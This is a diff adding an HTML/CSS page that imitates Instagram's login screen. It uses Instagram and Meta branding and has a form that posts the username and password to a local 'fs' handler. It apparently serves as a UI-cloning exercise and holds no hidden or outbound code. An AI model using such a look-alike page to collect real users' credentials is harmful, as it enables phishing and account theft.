@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram</title>
+  <link rel="stylesheet" href="./Instagram.css">
+  <link rel="icon"
+    href="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/2048px-Instagram_logo_2022.svg.png">
+  <style>
+    * {
+      padding: 0px;
+      margin: 0px;
+    }
+
+    .insta {
+      display: flex;
+      justify-content: center;
+      gap: 10px 5px;
+      font-family: segoe UI;
+
+
+    }
+
+    .left img {
+      height: 454px;
+      width: 531px;
+      padding: 100px 0px 0px 100px;
+    }
+
+    .right {
+      box-sizing: border-box;
+      height: 578px;
+      width: 321px;
+      padding: 0px 0px 0px 0px;
+      margin: 100px 0px;
+    }
+
+
+    .logo img {
+      height: 57px;
+      width: 191px;
+      padding: 0px 70px;
+    }
+
+    .input1 input {
+      height: 35px;
+      width: 247px;
+      padding-left: 5px;
+    }
+
+    ::placeholder {
+      font-size: 12px;
+    }
+
+    .input1 {
+      padding: 20px 0px 10px 35px;
+      border-radius: 2px;
+      box-sizing: border-box;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+    }
+
+    .password-container {
+  position: relative;
+  width: 100%;
+}
+
+.password-container input {
+  width: 89%;
+  padding: 10px;
+  padding-left: 5px;
+  padding-right: 50px; /* space for 'Show' */
+  font-size: 14px;
+  box-sizing: border-box;
+  border: 1px solid #444;
+  border-radius: 3px;
+}
+
+.password-container #toggleText {
+  position: absolute;
+  right: 35px;
+  top: 50%;
+  transform: translateY(-50%);
+  font-size: 13px;
+  font-weight: 600;
+  color: #b4b4b4;
+  cursor: pointer;
+  user-select: none;
+}
+
+
+    .login button {
+      display: flex;
+      justify-content: center;
+      padding: 7px 0px;
+      width: 255px;
+      height: 34px;
+      border: solid 1px #4cb5f9;
+      background-color: #4cb5f9;
+      color: white;
+      font-family: segoe UI;
+      font-size: 14px;
+      font-weight: bolder;
+      border-radius: 10px;
+      margin: 10px 0px 0px 40px;
+    }
+
+    .or span {
+      justify-content: center;
+      padding: 10px 17px;
+    }
+
+    .or {
+      margin: 20px 0px 0px 55px;
+    }
+
+    .facebook {
+      padding: 20px 0px 0px 80px;
+    }
+
+    .facebook img {
+      height: 24px;
+      width: 24px;
+      position: relative;
+      left: 0px;
+      top: 5px;
+    }
+
+    .facebook a {
+      text-decoration: none;
+      font-weight: bolder;
+      color: #3579ea;
+    }
+
+    .forgot {
+      padding: 20px 0px 0px 80px;
+    }
+
+    .forgot a {
+      text-decoration: none;
+      font-weight: lighter;
+      color: #00377e;
+    }
+
+    .signup {
+      display: flex;
+      padding: 55px 0px 0px 60px;
+    }
+
+    .signup h4 {
+      font-weight: lighter;
+      padding: 0px 10px 0px 0px;
+    }
+
+    .signup a {
+      text-decoration: none;
+      color: #3579ea;
+    }
+
+    .text h4 {
+      font-weight: lighter;
+    }
+
+    .text {
+      padding: 34px 0px 0px 125px;
+    }
+
+    .appimage {
+      display: flex;
+      height: 40px;
+      width: 132px;
+      padding: 10px 10px 0px 40px;
+      column-gap: 10px;
+      border-radius: 5px;
+    }
+
+    .footer {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 40px;
+    }
+
+    footer {
+      display: flex;
+      width: 70%;
+      justify-content: center;
+      flex-wrap: wrap;
+      gap: 30px;
+      align-items: center;
+      font-size: 14px;
+      font-weight: lighter;
+    }
+
+    #op {
+      border: none;
+    }
+
+    .ip input {
+      margin: 5px;
+    }
+
+    button:hover {
+  background-color: #3579ea;
+  color: white;
+  border: solid 1px #3579ea;
+  transform: scale(1.05);
+  transition: all 0.3s ease-in-out;
+}
+
+    .left img:hover {
+      transform: scale(1.05);
+      transition: all 0.3s ease-in-out;
+    }
+
+    @media all and (width<=888px) {
+      .left img {
+        display: none;
+      }
+
+      .footer {
+        display: none;
+      }
+
+      .footerMobile {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin-bottom: 40px;
+      }
+
+      .mobile {
+        display: flex;
+        width: 80%;
+        justify-content: center;
+        flex-wrap: wrap;
+        gap: 10px;
+        align-items: center;
+        font-size: 10px;
+        font-weight: lighter;
+      }
+    }
+
+    @media all and (width>=888px) {
+      .right {
+        box-sizing: border-box;
+        height: 578px;
+        width: 321px;
+        padding: 0px 0px 0px 0px;
+        margin: 100px 0px;
+      }
+
+      .footerMobile {
+        display: none;
+      }
+    }
+
+    :placeholder {
+      position: absolute;
+      left: 50px;
+      top: 65px;
+      transition: transform 0.2s ease, color 0.2s ease;
+      color: #999;
+    }
+
+    input:focus::placeholder {
+      transform: translateY(-10px);
+      color: #6d6e6f;
+      font-size: 10px;
+      transition: all 0.3s ease-in-out;
+    }
+
+    input:focus {
+      background-color: #fff;
+
+    }
+  </style>
+</head>
+
+<body>
+  <div class="insta">
+    <div class="left">
+      <img
+        src="https://i0.wp.com/technode.com/wp-content/uploads/2025/05/Screenshot-2025-05-09-at-5.16.29%E2%80%AFPM.png?fit=1344%2C1046&ssl=1"
+        alt="">
+    </div>
+    <div class="right">
+      <div class="logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1280px-Instagram_logo.svg.png" alt="">
+      </div>
+      <form action="fs" method="post">
+        <div class="ip">
+          <div class="input1">
+            <input type="text" placeholder="Phone number,username or email address" name="nm">
+            <br>
+            <div class="password-container">
+  <input type="password" id="password" placeholder="Password" name="ps">
+  <span id="toggleText">Show</span>
+</div>
+          </div>
+        </div>
+        <div class="login">
+          <button>Log in</button>
+        </div>
+      </form>
+      <div class="or">
+        _____________ <span style="color: #7C8080;"><sub><sub><big> OR
+              </big></sub></sub></span> _____________
+      </div>
+      <div class="facebook">
+        <img
+          src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1024px-Facebook_Logo_%282019%29.png"
+          alt="">
+        <a href="">Log in with Facebook </a>
+      </div>
+      <div class="forgot">
+        <a href="">Forgotten Your Password?</a>
+      </div>
+      <div class="signup">
+        <h4>Don't have an account?</h4>
+        <span><b><a href="./SignUp.html">Sign up</a></b></span>
+      </div>
+      <div class="text">
+        <h4>Get the app.</h4>
+      </div>
+      <div class="appimage">
+        <img src="https://static.cdninstagram.com/rsrc.php/v4/yz/r/c5Rp7Ym-Klz.png" alt="">
+        <img src="https://static.cdninstagram.com/rsrc.php/v4/yu/r/EHY6QnZYdNX.png" alt="">
+      </div>
+    </div>
+  </div>
+  <div class="footer">
+    <footer>
+      <h5>Meta</h5>
+      <h5>About</h5>
+      <h5>Blog</h5>
+      <h5>jobs</h5>
+      <h5>Help</h5>
+      <h5>API</h5>
+      <h5>Privacy</h5>
+      <h5>Terms</h5>
+      <h5>Locations</h5>
+      <h5>Instagram Lite</h5>
+      <h5>Threads</h5>
+      <h5>Contact Uploading and non-users</h5>
+      <h5>Meta Verified</h5>
+      <select id="op">
+        <option>English(UK)</option>
+        <option>Tamil</option>
+        <option>Hindi</option>
+        <option>Malayalam</option>
+      </select>
+      <h5>© 2025 Instagram from Meta</h5>
+    </footer>
+  </div>
+  <div class="footerMobile">
+    <footer class="Mobile">
+      <h5>Meta</h5>
+      <h5>About</h5>
+      <h5>Help</h5>
+      <h5>Privacy</h5>
+      <h5>Terms</h5>
+      <h5>Locations</h5>
+      <select id="op">
+        <option>English(UK)</option>
+        <option>Tamil</option>
+        <option>Hindi</option>
+        <option>Malayalam</option>
+      </select>
+      <h5>© 2025 Instagram from Meta</h5>
+    </footer>
+  </div>
+  
+<script>
+  const toggle = document.getElementById('toggleText');
+  const password = document.getElementById('password');
+
+  toggle.addEventListener('click', () => {
+    if (password.type === 'password') {
+      password.type = 'text';
+      toggle.textContent = 'Hide';
+    } else {
+      password.type = 'password';
+      toggle.textContent = 'Show';
+    }
+  });
+</script>
+
+</body>
+
+</html>
